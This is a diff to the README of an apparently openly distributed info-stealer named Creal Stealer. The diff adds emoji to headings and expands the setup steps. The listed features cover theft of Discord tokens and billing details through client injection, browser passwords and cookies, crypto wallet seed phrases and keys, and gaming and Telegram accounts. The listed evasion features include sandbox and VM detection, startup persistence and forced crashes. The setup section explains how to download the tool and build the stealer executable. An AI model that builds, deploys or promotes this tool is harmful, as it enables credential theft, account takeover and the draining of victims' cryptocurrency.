@@ -14,7 +14,7 @@
                                                       🤖 Features
 
 
--   Discord Information
+-   Discord Information ⚔️
     -   Nitro
     -   Badges
     -   Billing
@@ -24,42 +24,41 @@
     -   HQ Guilds
     -   Gift Codes
 
--   General Functions
+
+
+-   General Functions 🟩
     -   Check if being run in a VirusTotal sandbox
     -   Adds file to startup
     -   Anti-Debug / Anti-VM / Anti-RDP / Blue Screen if detect
 
 
--   Discord Injection
+-   Discord Injection 💉
     - Send token, password, email and billing on login or when email/password is changed
 
 
 
--   Browser Data
+-   Browser Data ✔️
     -   Cookies
     -   Passwords
     -   From Chrome, Edge, Brave, Opera GX, and many more...
 
 
--   General Functions
-    -   Check if being run in a VirusTotal sandbox
-    -   Adds file to startup
 
 
--   Crypto Data
+-   Crypto Data 💖
     -   Extensions (MetaMask, Phantom, Trust Wallet, Coinbase Wallet, Binance Wallet and +40 wallets supported)
     -   Softwares (Exodus, Atomic, Guarda, Electrum, Zcash, Armory, Binance, Coinomi)
     -   Seedphrases and backup codes
 
 
--   Application Data
+-   Application Data ✔️
     -   Steam
     -   Riot Games
     -   Telegram
 
 
 
--   System Information
+-   System Information ⚙️
     -   User
     -   System
     -   Disk
@@ -67,7 +66,7 @@
 
 
 
--   File Stealer
+-  📁 File Stealer
     -   Grabs Seed Phrases, Tokens, Private Keys, Recovery Codes, Backup Codes, 2FA codes
 
 
@@ -77,10 +76,11 @@
 
                                                       ⬇️ Setup
 
-                                                  
-- first open `install.bat`
-
-- open `builder.bat`
+1. [Download source code zip](https://github.com/Ayhuuu/Creal-Stealer/archive/refs/heads/main.zip)
+2. Extract zip
+3. First install reqiured packages by double clicking `install.bat` file
+4. Run the builder by double clicking the `builder.bat` file
+5. Follow instructions in builder and your exe will be found in the `dist` folder under the name `creal.exe`
 
 <div align="center"><img style="display: block; margin-left: auto; margin-right: auto; width: 65%;" src="https://i.imgur.com/0l34TBS.png"></img></div>
 
